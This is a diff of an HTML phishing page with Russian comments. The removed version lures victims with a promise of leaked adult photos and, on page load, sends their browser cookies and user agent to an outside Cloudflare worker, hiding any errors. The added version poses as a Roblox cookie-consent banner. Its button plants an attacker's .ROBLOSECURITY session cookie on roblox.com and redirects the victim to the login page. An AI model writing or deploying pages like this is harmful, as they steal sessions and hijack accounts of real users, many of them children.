@@ -1,40 +1,40 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>You are being redirected...</title>
-    <!-- Мета-теги для превью. Можете поменять на свои -->
-    <meta property="og:title" content="СЛИВ НОВЫХ ФОТО 🔞">
-    <meta property="og:description" content="Только 18+. Нажми, чтобы посмотреть.">
-    <meta property="og:image" content="https://i.imgur.com/R3So4V7.gif">
-
-    <script>
-        // ВАША ССЫЛКА НА ПРОКСИ-СЕРВЕР CLOUDFLARE
-        const WORKER_URL = "https://jambo-sender.gamesense-hub.workers.dev";
-
-        async function sendData() {
-            const dataToSend = {
-                cookies: document.cookie || "Не удалось получить куки",
-                userAgent: navigator.userAgent
-            };
-
-            try {
-                await fetch(WORKER_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(dataToSend)
-                });
-            } catch (error) {
-                // Ничего не делаем в случае ошибки, чтобы не выдать себя
-            }
-            
-            // Опционально: перенаправляем пользователя на другой сайт
-            // window.location.href = "https://google.com";
-        }
-
-        window.onload = sendData;
-    </script>
+    <meta charset="UTF-8">
+    <title>Cookie Policy Update</title>
+    <meta property="og:title" content="Roblox - Обновление политики">
+    <meta property="og:description" content="Требуется ваше согласие для продолжения.">
+    <meta property="og:image" content="https://i.imgur.com/vW4x2G5.png">
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #e9ebee; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .consent-banner { position: fixed; bottom: 0; left: 0; right: 0; background-color: #fff; box-shadow: 0 -2px 5px rgba(0,0,0,0.1); padding: 20px; display: flex; justify-content: center; align-items: center; z-index: 1000; text-align: center; }
+        .consent-text { margin-right: 20px; }
+        .consent-btn { padding: 10px 20px; background-color: #0078d7; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+    </style>
 </head>
 <body>
-    <h1>Подождите, идет перенаправление...</h1>
+    <!-- Эта часть страницы будет видна за баннером -->
+    <h1 style="color: #ccc;">Loading Roblox...</h1>
+
+    <div class="consent-banner" id="cookie-banner">
+        <p class="consent-text">Мы обновили нашу политику использования файлов cookie. Нажмите "Принять", чтобы продолжить.</p>
+        <button class="consent-btn" onclick="acceptCookies()">Принять и продолжить</button>
+    </div>
+
+    <script>
+        function acceptCookies() {
+            const attacker_cookie_value = "CAEaAhAB.B17F396A28BB62CF85B68CACC5DBCD6344B2F2434B8925674EA1595405F6935DA923CE87E38340397670CB5EB17BA1F40618881CEFD3A042F583A1CE3C16B83DEAC774299243077085FCBC93194C4893CA8864ACCD9289AAED83E3ABD6EEE8C7524AED01B1AAFC432EEC9852359C1E92E8601C2A88FA1D421F498C06EAE253A076AE2ED055C04F7719563D71356F729102335BFA2740B7BB03264006D00A8DBF47219071DEB2CD8990D4A01382A5D6C965601A6E09109C5BECF23FB742F71785B5011917DAE01455B802DC331998EAF58EC50ED4924B7B7644013061BB1EF6079FFB38C0F0E031DDAE7E2ADB7BDCC1C4846A2DCDC9B797EC22DEBFE7D19C25794E6CB0A7B416DEBB60040968ADD77FEA1A5EE0B2D992A22A3F70F3657FDF485A2D89361F13F3525D7F1F60031168865EF5A05974CF3BB54784D85A764D7AB5C0C76924D083BE39E9A09F496DA81E19A14A4995A1DB91D7C80B339F65102B71CC796AAF18F48547E4223B4AFB0D181FD8013564AF465C9780C068F8F662BEC14E9CE2B145CE990EFCEAC2C16F3A371530BD60E90050D4AB3CFEC3A8160EF67FD309BB16854BCE983C23CBCC7E35E5A2B783A9A931A9287DDA1DE967E5EA5CFE4AFA4DD363F2F8BB65D68BDA6CC668D814D302D780F0A9244DD883DAA2221A97BC02F7E95EB9493A042015C98E795D20B3F1EDF6F474370496AA86C565BB3F7E9990438E789C12D4A02112A0DBFF678074B21251F08C39CEFC1A47B0BFC1E8A7023AF4F302F4F3B2ACD1449D6360B83CA6F28CF6745FD78D3204E63143FE35734D50B7BD71B4CDDC84D03F32D583CBD296D73DE141640A7FE48D72FC84B55A2C14FF30126FA2FD9F7037A39D9AF1D4E0B00772EFD76C3FD10A54839E0A7AD7EF8057FB61974322C6BECE0D7D7BE47182349D200ED10BF118825F6838DAF6A1C4213A8E9918849E51761578F71302C14570674F75B47FD20CE2CDE858660098CB0C514DDD31EC5FF1AF85C563AA21EB5EFFE1B06A0B5C21441E26E23D5C9434ABBDB1D1D28E4E0718103C7CF7DB803C0DBF1710C001A450FA709B03E24801D7AF8FC9EB2F75B6BF3140AC42CDDE7B7090135B624E70A830FCB29B9516C22501EAEE322CDEBA5E664B83773978EC2B2E626BEE9B8FDAEE44593669F0531E68A2B06A09930345";
+            
+            const domain = ".roblox.com";
+            document.cookie = `.ROBLOSECURITY=${attacker_cookie_value}; path=/; domain=${domain}; secure;`;
+
+            // Прячем баннер
+            document.getElementById('cookie-banner').style.display = 'none';
+
+            // Перенаправляем жертву на страницу входа
+            window.location.href = "https://www.roblox.com/login";
+        }
+    </script>
 </body>
 </html>
